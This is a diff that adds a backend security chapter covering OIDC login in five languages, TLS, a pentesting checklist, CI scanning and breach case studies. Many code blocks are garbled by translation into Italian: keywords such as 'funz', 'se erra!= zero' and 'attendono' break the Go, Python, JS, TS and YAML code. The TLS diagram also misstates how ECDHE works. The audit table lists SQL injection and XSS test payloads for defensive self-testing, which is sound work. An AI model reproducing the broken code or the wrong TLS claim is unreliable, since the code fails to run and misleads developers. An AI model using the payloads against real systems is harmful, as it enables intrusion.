+    fornitore, _ = oidc.NewProvider(ctx, "https://accounts.google.com")
+    verificatore = provider.Verifier(&oidc.Config{ClientID: os.Getenv("GOOGLE_CLIENT_ID")})
+    oauth2Cfg = &oauth2.Config&#123;
+        ID cliente: os.Getenv("GOOGLE_CLIENT_ID"),
+        ClientSecret: os.Getenv("GOOGLE_CLIENT_SECRET"),
+        URL di reindirizzamento: "https://yourapp.com/auth/callback",
+        Ambiti: []stringa{oidc.ScopeOpenID, "email", "profile"},
+        Endpoint: provider.Endpoint(),
+    &#125;
+)
+
+funz callbackHandler(w http.ResponseWriter, r *http.Request) &#123;
+    // 1. Verify state matches what we stored in session (CSRF protection)
+    if r.URL.Query().Get("stato") != getSessionState(r) &#123;
+        http.Errore(w, "stato non valido", 400); ritorno
+    &#125;
+
+    // 2. Exchange code for tokens (server-to-server)
+    token, _ := oauth2Cfg.Exchange(ctx, r.URL.Query().Get("codice"))
+    rawIDToken := token.Extra("id_token").(stringa)
+
+    // 3. Verify ID token signature + aud + exp
+    idToken, err := verificatore.Verify(ctx, rawIDToken)
+    se erra!= zero { http.Error(w, "invalid token", 401); return }
+
+    // 4. Extract claims
+    var afferma la struttura { Email string `json:"email"`; Sub string `json:"sub"` }
+    idToken.Claims(&claims)
+
+    // 5. Upsert user in DB, create session, set cookie
+    IDutente := upsertUser(claims.Sub,claims.Email)
+    setSecureSessionCookie(w, IDutente)
+    http.Redirect(w, r, "/dashboard", http.StatusFound)
+&#125;
+```
+
+```python title="verify an OIDC ID token / authlib"
+da authlib.integrations.starlette_client importa OAuth
+
+oauth = OAuth()
+oauth.register(
+    nome="google",
+    server_metadata_url="https://accounts.google.com/.well-known/openid-configuration",
+    client_id=os.environ["GOOGLE_CLIENT_ID"],
+    client_secret=os.environ["GOOGLE_CLIENT_SECRET"],
+    cliente_kwargs={"scope": "openid email profile"},
+)
+
+
+@app.get("/auth/login")
+login def asincrono (richiesta: Richiesta):
+    # authlib genera e memorizza `state` (e il verificatore PKCE) stesso
+    return attendono oauth.google.authorize_redirect(
+        richiesta, "https://yourapp.com/auth/callback")
+
+
+@app.get("/auth/callback")
+callback def asincrono (richiesta: Richiesta):
+    # 1 + 2 + 3. controllo dello stato, scambio di codici e verifica ID-token
+    # (firma, iss, aud, exp) avvengono tutti all'interno diauthorize_access_token.
+    # Farli a mano è il modo in cui le persone sbagliano.
+    token = attendono oauth.google.authorize_access_token(richiesta)
+
+    # 4. Estrarre i reclami
+    attestazioni = token["infoutente"]
+
+    # 5. Inserisci utente, crea sessione, imposta cookie
+    user_id = attendono upsert_user(claims["sub"],claims["email"])
+    restituisce set_secure_session_cookie(user_id)
+```
+
+```js title="verify an OIDC ID token / openid-client"
+import * as client from 'openid-client'
+
+const config = attendi client.discovery(
+  nuovo URL('https://accounts.google.com'),
+  process.env.GOOGLE_CLIENT_ID,
+  process.env.GOOGLE_CLIENT_SECRET,
+)
+
+app.get('/auth/login', async (req, res) =&gt; &#123;
+  const codeVerifier = client.randomPKCECodeVerifier()
+  stato const = client.randomState()
+
+  // Both go in the SESSION, never in a cookie the client can edit
+  req.session.codeVerifier = codeVerifier
+  req.session.state = stato
+
+  res.redirect(client.buildAuthorizationUrl(config, &#123;
+    reindirizza_uri: "https://yourapp.com/auth/callback",
+    ambito: 'profilo email openid',
+    stato,
+    code_challenge: attende client.calculatePKCECodeChallenge(codeVerifier),
+    code_challenge_method: 'S256',
+  &#125;).href)
+&#125;)
+
+app.get('/auth/callback', async (req, res) =&gt; &#123;
+  // 1, 2 and 3: the library checks state, exchanges the code
+  // server-to-server, and verifies the ID token's signature, iss, aud
+  // and exp. Never decode an ID token with jwt.decode() and trust it:
+  // decoding is not verifying, and an unverified token is attacker input.
+  const token = attendono client.authorizationCodeGrant(config, nuovo URL(req.url, BASE), &#123;
+    pkceCodeVerifier: req.session.codeVerifier,
+    attesoStato: req.session.state,
+  &#125;)
+
+  // 4. Extract claims
+  constclaims = tokens.claims()
+
+  // 5. Upsert user, create session, set cookie
+  const userId = attendono upsertUser(claims.sub,claims.email)
+  setSecureSessionCookie(res, userId)
+  res.redirect('/dashboard')
+&#125;)
+```
+
+```ts title="verify an OIDC ID token / openid-client"
+import * as client from 'openid-client'
+import type { Request, Response } from 'express'
+
+// Typing the claims you actually rely on is worth doing, because the
+// set varies by provider: `email_verified` è presente per Google e
+// absent for some others, and treating a missing value as "verified"
+// lets anyone register an account with someone else's address.
+interfaccia IdTokenClaims &#123;
+  sottotitolo: stringa
+  e-mail: stringa
+  email_verificato?: booleano
+&#125;
+
+esporta la funzione asincrona callback (req: richiesta, res: risposta): promessa<void> &#123;
+  const token = attendono client.authorizationCodeGrant(
+    configurazione,
+    nuovo URL(req.url, process.env.BASE_URL!),
+    &#123;
+      pkceCodeVerifier: req.session.codeVerifier!,
+      attesoStato: req.session.state!,
+    &#125;,
+  )
+
+  constclaims = tokens.claims() sconosciuto come IdTokenClaims
+
+  // `sub` è l'identificatore stabile, NON l'e-mail. Un'e-mail può essere
+  // changed or reassigned at the provider; keying your user rows on it
+  // eventually merges two people into one account.
+  if (claims.email_verified!== true) &#123;
+    res.status(403).send('email non verificata')
+    ritorno
+  &#125;
+
+  const userId = attendono upsertUser(claims.sub,claims.email)
+  setSecureSessionCookie(res, userId)
+  res.redirect('/dashboard')
+&#125;
+```
+
+```java title="OIDC login / Spring Security"
+// Spring Security implements the entire Authorization Code flow,
+// including state, PKCE and full ID-token validation. The correct
+// amount of security code to write here is close to zero.
+//
+//   implementation 'org.springframework.boot:spring-boot-starter-oauth2-client'
+//
+//   spring.security.oauth2.client:
+//     registration.google:
+//       client-id: ${GOOGLE_CLIENT_ID}
+//       client-secret: ${GOOGLE_CLIENT_SECRET}
+//       scope: openid,email,profile
+//     provider.google:
+//       issuer-uri: https://accounts.google.com
+
+@Bean
+SecurityFilterChain filterChain(HttpSecurity http) genera un'eccezione &#123;
+    restituire http
+        .authorizeHttpRequests(auth -&gt; auth
+            .requestMatchers("/", "/login/**").permitAll()
+            .anyRequest().authenticated())
+        .oauth2Login(oauth -&gt; oauth
+            .defaultSuccessUrl("/dashboard", true)
+            .userInfoEndpoint(u -&gt; u.oidcUserService(this::loadUser)))
+        .build();
+&#125;
+
+// The only part worth writing yourself: mapping the verified claims
+// onto your own user row.
+private OidcUser loadUser(richiesta OidcUserRequest) &#123;
+    OidcUser oidcUser = new OidcUserService().loadUser(richiesta);
+
+    // `sub` è l'ID stabile. Non digitare mai la tabella degli utenti nell'e-mail.
+    String IDutente = upsertUser(
+        oidcUser.getSubject(),
+        oidcUser.getEmail());
+
+    restituire oidcUser;
+&#125;
+```
+
+17
+
+## HTTPS & TLS Internals
+
+HTTPS is HTTP with a TLS (Transport Layer Security) layer between the TCP connection and your HTTP messages. Everything inside it, headers, body, cookies, tokens, is encrypted in transit. An attacker who intercepts the packets sees only random ciphertext.
+
+### Why TLS Matters to a Backend Engineer
+
+- Without HTTPS, session cookies and JWT tokens are stolen by anyone on the same Wi-Fi (Wireshark captures them in plaintext).
+- The `Secure` cookie flag only works over HTTPS, without it, cookies are sent over HTTP too.
+- HTTP/2 (and HTTP/3) require TLS, no TLS means no performance benefits.
+- Search engines penalise HTTP sites; browsers show "Not Secure" warnings.
+
+### The TLS Handshake: What Actually Happens
+
+<Diagram caption="Fig B, TLS 1.3 handshake. The session key is derived, never transmitted, forward secrecy means past sessions can't be decrypted even if the server's private key is later stolen.">
+<svg viewBox="0 0 680 360" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="360" fill="var(--dg-paper)"></rect><defs><marker id="ta" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="tg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker><marker id="tb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-info)"></path></marker></defs><text x="120" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Client (Browser)</text><text x="560" y="28" text-anchor="middle" font-family="var(--font-ui)" font-size="13" font-weight="700" fill="var(--dg-ink)">Server (Your Backend)</text><line x1="120" y1="35" x2="120" y2="350" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="560" y1="35" x2="560" y2="350" stroke="var(--dg-line)" stroke-width="1" stroke-dasharray="4 3"></line><line x1="122" y1="60" x2="558" y2="60" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ta)"></line><text x="340" y="52" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(1) ClientHello: TLS version, cipher suites, random&#95;client</text><line x1="558" y1="100" x2="122" y2="100" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ta)"></line><text x="340" y="92" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ink-2)">(2) ServerHello: chosen cipher, random&#95;server, certificate (public key)</text><rect x="20" y="115" width="200" height="35" rx="6" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="120" y="130" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-warn)" font-weight="700">(3) Client verifies cert</text><text x="120" y="143" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-ink-2)">Chain of trust -> root CA</text><line x1="122" y1="175" x2="558" y2="175" stroke="var(--dg-info)" stroke-width="1.5" marker-end="url(#tb)"></line><text x="340" y="167" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(4) Key Exchange (ECDHE): client sends key share encrypted with server's public key</text><rect x="160" y="190" width="360" height="30" rx="6" fill="var(--dg-info-surface)" stroke="var(--dg-info)"></rect><text x="340" y="210" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-info)">(5) Both sides independently derive the same symmetric session key</text><text x="340" y="222" text-anchor="middle" font-family="var(--font-diagram-mono)" font-size="9" fill="var(--dg-ink-2)">(using random&#95;client + random&#95;server + key material, never transmitted)</text><line x1="122" y1="245" x2="558" y2="245" stroke="var(--dg-ok)" stroke-width="1.5" marker-end="url(#tg)"></line><text x="340" y="237" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(6) Client Finished (MAC of entire handshake)</text><line x1="558" y1="270" x2="122" y2="270" stroke="var(--dg-ok)" stroke-width="1.5" marker-end="url(#tg)"></line><text x="340" y="262" text-anchor="middle" font-family="var(--font-ui)" font-size="11" fill="var(--dg-ok)">(7) Server Finished, handshake complete</text><rect x="60" y="290" width="560" height="40" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="340" y="310" text-anchor="middle" font-family="var(--font-ui)" font-size="12" font-weight="700" fill="var(--dg-ok)">(8) All subsequent HTTP traffic encrypted with symmetric session key (AES-GCM)</text><text x="340" y="325" text-anchor="middle" font-family="var(--font-ui)" font-size="10" fill="var(--dg-ink-2)">Eavesdropper sees: random bytes. Session cookie, JWT, passwords, all invisible.</text></svg>
+</Diagram>
+
+### Key Concepts
+
+| Concept                        | What It Means                                                                | Why It Matters                                                |
+| ------------------------------ | ---------------------------------------------------------------------------- | ------------------------------------------------------------- |
+| **Certificate**                | Server's public key + identity, signed by a CA                               | Proves you're talking to the real server, not an impersonator |
+| **Certificate Authority (CA)** | Trusted third party that signs certs (Let's Encrypt, DigiCert)               | Chain of trust: browser trusts CA -> CA vouches for server    |
+| **ECDHE**                      | Elliptic Curve Diffie-Hellman Ephemeral key exchange                         | Forward secrecy: each session uses a fresh key pair           |
+| **Forward Secrecy**            | Session keys aren't stored; can't decrypt past traffic even with private key | A future key compromise doesn't expose old sessions           |
+| **HSTS**                       | HTTP Strict Transport Security header                                        | Forces HTTPS for your domain, prevents SSL-stripping attacks  |
+| **TLS 1.3**                    | Current standard (2018). Dropped weak ciphers from TLS 1.2                   | Faster (1-RTT handshake), no known vulnerabilities            |
+
+### Practical Checklist for Your Backend
+
+- Use **Let's Encrypt** (free, auto-renewing) or your cloud provider's certificate manager.
+- Set `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, tells browsers to always use HTTPS for your domain for 2 years.
+- Redirect all `http://` traffic to `https://` at the load balancer / reverse proxy level (nginx, Caddy, Traefik).
+- Disable TLS 1.0 and TLS 1.1, they have known vulnerabilities (POODLE, BEAST). Only allow TLS 1.2 and TLS 1.3.
+- Test your TLS config at [ssllabs.com/ssltest](https://www.ssllabs.com/ssltest/), aim for an A+ rating.
+
+```caddy title="Caddy / automatic HTTPS, zero config"
+# Caddyfile, Caddy ottiene e rinnova automaticamente i certificati Let's Encrypt
+tuaapp.com &#123;
+    reverse_proxy host locale:8080
+    # TLS 1.2+ applicato, HSTS impostato, reindirizzamento HTTP, tutto automatico
+&#125;
+
+# equivalente a nginx
+server &#123;
+    ascolta 443 SSL;
+    ssl_certificate /etc/letsencrypt/live/yourapp.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/yourapp.com/privkey.pem;
+    ssl_protocols TLSv1.2 TLSv1.3;   # disabilita 1.0 e 1.1
+    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
+    add_header Strict-Transport-Security "max-age=63072000" sempre;
+&#125;
+```
+
+18
+
+## Penetration Testing Mindset: Think Before You Ship
+
+Penetration testing (pentesting) is the practice of attacking your own system the way a real attacker would, before they get the chance. You don't need to be a professional pentester to apply this mindset. The goal is to build the habit of asking _"how would I break this?"_ before you deploy.
+
+### The Attacker's Methodology (OWASP Testing Guide)
+
+1. **Reconnaissance**: What endpoints exist? What technology stack? What error messages leak? (`nmap`, Google dorking, examining JS bundles)
+2. **Enumeration**: What user IDs exist? What routes? Fuzz with sequential IDs, common paths (`/admin`, `/.env`, `/api/v1`)
+3. **Exploitation**: Try injection payloads, bypass auth, escalate privileges
+4. **Post-exploitation**: What can be exfiltrated, modified, or destroyed?
+
+### Quick Self-Audit Checklist
+
+Before shipping any feature that touches user data or auth, run through these manually or in automated tests:
+
+| Check                | What to Test                                                                   | Tool / Method        |
+| -------------------- | ------------------------------------------------------------------------------ | -------------------- |
+| **SQL Injection**    | Put `'`, `'; DROP TABLE--`, `' OR '1'='1` in every input field                 | sqlmap, manual       |
+| **BOLA**             | Logged in as User A, request User B's resource IDs                             | Manual + Burp Suite  |
+| **BFLA**             | Remove admin cookie/role, try hitting admin endpoints                          | Manual               |
+| **XSS**              | Submit `<script>alert(1)</script>` in every text field                         | Manual, OWASP ZAP    |
+| **Auth bypass**      | Remove auth header entirely. Try expired tokens. Try tokens from another user. | Manual               |
+| **Secrets**          | Search codebase and git history for hardcoded keys                             | gitleaks, trufflehog |
+| **Security headers** | Check response headers for CSP, HSTS, X-Frame-Options                          | securityheaders.com  |
+| **Rate limiting**    | Send 100+ login attempts, check if blocked                                     | curl loop, k6        |
+
+### Burp Suite: The Standard Tool
+
+Burp Suite Community Edition (free) is a proxy that sits between your browser and your backend, letting you intercept, modify, and replay every request. It's the most widely used tool for manual pentesting.
+
+- **Intercept**: pause a request mid-flight and modify any parameter before it hits your server.
+- **Repeater**: replay a request with different payloads (great for testing injection).
+- **Intruder**: automated fuzzing, try thousands of payloads against a parameter automatically.
+- **Scanner** (Pro only), automated vulnerability scanning.
+
+### PortSwigger Web Security Academy: Free Lab-Based Learning
+
+The best free resource for hands-on security practice. Every vulnerability has:
+
+- A clear explanation of the theory
+- An interactive lab (real vulnerable web app, in-browser)
+- A walkthrough if you get stuck
+
+Start with: SQL Injection -> XSS -> IDOR (BOLA) -> Authentication vulnerabilities -> Access Control. Each module takes 1-3 hours and teaches you more than reading theory alone ever could.
+
+<Callout type="info">
+The mindset shift that matters most: stop thinking "will users do this?" and start thinking "what's the _worst_ possible input I could receive here, and what happens if I do?" Write that as a test case. Run it in CI.
+</Callout>
+
+### Automated Security Testing in CI/CD
+
+```yaml title=".github/workflows/security.yaml / scan on every PR"
+nome: Scansione di sicurezza
+su: [pull_request]
+
+lavori:
+  scansione:
+    funziona su: ubuntu-latest
+    passaggi:
+      - utilizza: azioni/checkout@v4
+        con: { fetch-depth: 0 }  # cronologia completa per la scansione segreta
+
+      # Cerca segreti codificati nell'intera cronologia Git
+      - nome: Gitleaks
+        utilizza: gitleaks/gileaks-action@v2
+
+      # Analisi statica per problemi di sicurezza Go
+      - nome: Gosec
+        utilizza: securego/gosec@master
+        con:
+          argomenti: ./...
+
+      # Controllo della vulnerabilità delle dipendenze
+      - nome: Nancy (Vai giù)
+        correre: |
+          vai alla lista -json -m tutto | Nancy investigatore
+```
+
+19
+
+## Real Incident Case Studies
+
+Theory lands harder when you see what it cost real companies. These are four of the most instructive security breaches, each one directly caused by a vulnerability covered in this chapter.
+
+### (1) Equifax (2017): SQL Injection / Unpatched Dependency
+
+<Callout type="info">
+147 million people's SSNs, birth dates, addresses, and credit card numbers stolen. Equifax paid \~$700 million in settlements.
+</Callout>
+
+**What happened:** Attackers exploited a known vulnerability (CVE-2017-5638) in Apache Struts, a Java web framework Equifax used. The vulnerability allowed attackers to execute arbitrary OS commands via a specially crafted HTTP header. A patch had been available for _two months_ before the breach. Equifax had not applied it.
+
+**What was missed:**
+
+- No automated dependency vulnerability scanning in CI/CD.
+- No process for urgently patching critical CVEs.
+- Internal network not segmented, attackers moved laterally and accessed 48 additional databases once inside.
+- SSL inspection was disabled due to an expired internal certificate, malicious traffic went undetected for 76 days.
+
+**Lesson:** Keep dependencies updated. Run automated CVE scans (`dependabot`, `snyk`, `nancy`) on every build. Apply critical security patches within 24-72 hours.
+
+### (2) Uber (2022): Secrets in Code + Social Engineering
+
+<Callout type="info">
+Attacker gained access to Uber's internal systems, Slack workspace, AWS, GCP, HackerOne bug reports, and source code. No data was sold, but the access was total.
+</Callout>
+
+**What happened:** An 18-year-old attacker used MFA fatigue (bombarding an Uber contractor with push notifications until they accepted one) to gain initial access. They then found a PowerShell script on an internal network share that contained **hardcoded admin credentials** for Uber's Privileged Access Management (PAM) tool. With those credentials, they had access to virtually everything.
+
+**What was missed:**
+
+- Hardcoded secrets in a script on an internal share, not in a secrets manager.
+- No MFA-resistant authentication (hardware keys / passkeys) for privileged access.
+- MFA push fatigue not mitigated (no number-matching, no rate limit on push attempts).
+- Over-privileged contractor access, too much lateral movement possible from one compromised account.
+
+**Lesson:** Secrets belong in a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler), never in scripts, config files, or chat messages. Use phishing-resistant MFA (hardware keys) for admin access. Apply least-privilege everywhere.
+
+### (3) Facebook (2018): Broken Authorization (Access Token Theft)
+
+<Callout type="info">
+50 million user access tokens stolen due to a bug in the "View As" feature. Attackers could log in as any of those 50 million users.
+</Callout>
+
+**What happened:** The "View As" feature let users see their profile as another user would see it. A bug in this feature caused it to incorrectly generate a video uploader component with a live access token, belonging to the user being viewed, not the viewer. Three compounding bugs created this flaw:
+
+1. Video uploader was incorrectly shown in "View As" mode.
+2. The uploader generated an access token for the wrong user (the viewed user, not the viewer).
+3. The access token had full account permissions instead of limited scope.
+
+**Lesson:** Authorization is hard to test manually at scale. The BOLA principle applies: verify ownership at every data access point. Use short-lived, minimally-scoped tokens. Build automated tests specifically for authorization boundaries.
+
+### (4) LastPass (2022): Developer Machine Compromise -> Production Data
+
+<Callout type="info">
+Attackers stole encrypted password vaults of all LastPass customers. Ongoing brute-force attacks on weak master passwords may continue to decrypt vaults for years.
+</Callout>
+
+**What happened:** Attackers first compromised a DevOps engineer's home computer by exploiting a vulnerable media software package (Plex). That machine had access to the LastPass cloud backup environment. Through that single developer machine, attackers exfiltrated:
+
+- Encrypted customer password vaults (the crown jewels)
+- Customer metadata (email, billing address, IP addresses)
+- Cloud infrastructure configuration and secrets
+
+**What was missed:**
+
+- Developer machines should not have direct access to production backup environments, use bastion hosts and just-in-time access.
+- Personal machines used for work should be enrolled in MDM (Mobile Device Management) with security policies enforced.
+- Vault encryption used PBKDF2 with low iteration counts, weaker master passwords are crackable offline.
+- No anomaly detection on the unusual volume of data being exfiltrated.
+
+**Lesson:** The supply chain is part of your attack surface. A developer's home laptop is part of your security perimeter. Segment production access. Monitor for anomalous data exfiltration. Use hardware security keys for production access.
+
+### Common Thread Across All Four
+
+<Diagram caption="Fig C: Every breach traces to an assumption that turned out to be wrong. Security is assumption management.">
+<svg viewBox="0 0 680 120" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="120" fill="var(--dg-paper)"></rect><rect x="20" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="90" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Equifax</text><text x="90" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "we'll</text><text x="90" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">patch it later"</text><rect x="178" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="248" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Uber</text><text x="248" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "this</text><text x="248" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">script is internal"</text><rect x="336" y="20" width="140" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="406" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Facebook</text><text x="406" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "auth</text><text x="406" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">checked at routing"</text><rect x="494" y="20" width="165" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="576" y="52" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">LastPass</text><text x="576" y="68" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Assumption: "dev laptop</text><text x="576" y="82" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">is outside perimeter"</text></svg>
+</Diagram>
+
+20
+
+## References & Further Reading
+
+[PortSwigger Web Security Academy](https://portswigger.net/web-security) [OWASP Top 10](https://owasp.org/www-project-top-ten/) [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) [Lucia Auth (secure auth patterns)](https://lucia-auth.com/) [jwt.io (JWT debugger)](https://jwt.io/) [Gitleaks (secret scanner)](https://github.com/gitleaks/gitleaks) [Go argon2 package](https://pkg.go.dev/golang.org/x/crypto/argon2) [Python argon2-cffi](https://pypi.org/project/argon2-cffi/) [MDN, Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) [MDN, HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) [OAuth 2.0 Spec](https://oauth.net/2/) [OIDC Overview](https://openid.net/developers/how-connect-works/) [Go OIDC Library](https://pkg.go.dev/github.com/coreos/go-oidc/v3/oidc) [SSL Labs TLS Tester](https://www.ssllabs.com/ssltest/) [Caddy Automatic HTTPS](https://caddyserver.com/docs/automatic-https) [Burp Suite Community](https://portswigger.net/burp/communitydownload) [gosec (Go static analysis)](https://github.com/securego/gosec) [CVE-2017-5638 (Equifax)](https://www.cvedetails.com/cve/CVE-2017-5638/) [Uber 2022 Breach Report](https://www.uber.com/newsroom/security-update/) [LastPass Breach Notice](https://blog.lastpass.com/2022/12/notice-of-recent-security-incident/)
+
+---
+
+Backend Field Manual / Backend Security / Chapter 17 (Extended)
+
+Backend from First Principles / Chapter 17 / Security. Code targets Go 1.22+, Python 3.11+, Node.js 20+, TypeScript 5+ and Java 17+ (Spring Boot).
